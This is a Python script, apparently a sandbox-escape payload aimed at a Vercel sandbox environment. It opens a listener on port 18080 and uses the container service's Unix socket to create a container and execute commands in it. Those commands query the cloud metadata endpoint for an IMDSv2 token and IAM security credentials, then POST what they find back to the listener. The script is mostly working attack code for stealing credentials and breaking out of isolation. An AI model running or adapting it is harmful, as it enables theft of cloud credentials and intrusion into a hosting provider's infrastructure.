# -*- coding: utf-8 -*-
"""v74 payload: HTTP server 监听 18080; Exec 回连验证 + IMDS 探测 (结果回传)"""
import socket, time, os, subprocess, json, threading
from http.server import BaseHTTPRequestHandler, HTTPServer

OUT = '/vercel/sandbox/v74c.out'
HITS = []


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v74c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        HITS.append((time.time(), 'GET ' + self.path))
        body = b'hit' + self.path.encode()
        self.send_response(200)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        log('SERVER GET %s from %s' % (self.path, self.client_address))

    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        b = self.rfile.read(n) if n else b''
        HITS.append((time.time(), 'POST ' + self.path + ' ' + b[:500].decode(errors='replace')))
        self.send_response(200)
        self.send_header('Content-Length', '2')
        self.end_headers()
        self.wfile.write(b'ok')
        log('SERVER POST %s len=%d: %s' % (self.path, n, b[:400].decode(errors='replace')))

    def log_message(self, *a):
        pass


def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:500].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


def main():
    log('V74 payload start pid=%d' % os.getpid())
    srv = HTTPServer(('0.0.0.0', 18080), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    log('server on 18080')

    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'
    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if not cid:
        log('V74C_DONE')
        return
    rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
    log('started')
    time.sleep(1)

    # Exec1: 回连 payload server
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c', 'curl -s --max-time 5 http://127.0.0.1:18080/ping1 || echo P1FAIL'])
    log('exec1 -> %s | %s' % (st, bd[:150]))
    time.sleep(2)

    # Exec2: curl IMDS 结果回传
    cmd2 = ('OUT=$(curl -s --max-time 5 http://169.254.169.254/latest/meta-data/ 2>&1); '
            'echo "IMDS_START"; echo "$OUT" | head -c 2000; echo "IMDS_END"; '
            'curl -s --max-time 5 -d "$OUT" http://127.0.0.1:18080/imds || echo P2FAIL')
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c', cmd2], t=10)
    log('exec2 -> %s | %s' % (st, bd[:150]))
    time.sleep(4)

    # Exec3: IMDS 完整 token (IMDSv2) 尝试
    cmd3 = ('TOK=$(curl -s -X PUT --max-time 5 -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" '
            'http://169.254.169.254/latest/api/token 2>&1); '
            'OUT=$(curl -s --max-time 5 -H "X-aws-ec2-metadata-token: $TOK" '
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1); '
            'curl -s --max-time 5 -d "TOK=$TOK OUT=$OUT" http://127.0.0.1:18080/imds2 || echo P3FAIL')
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c', cmd3], t=10)
    log('exec3 -> %s | %s' % (st, bd[:150]))
    time.sleep(4)

    log('HITS=%d' % len(HITS))
    for t0, h in HITS:
        log('HIT %s' % h[:400])

    rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
    log('killed')
    log('V74C_DONE')


main()
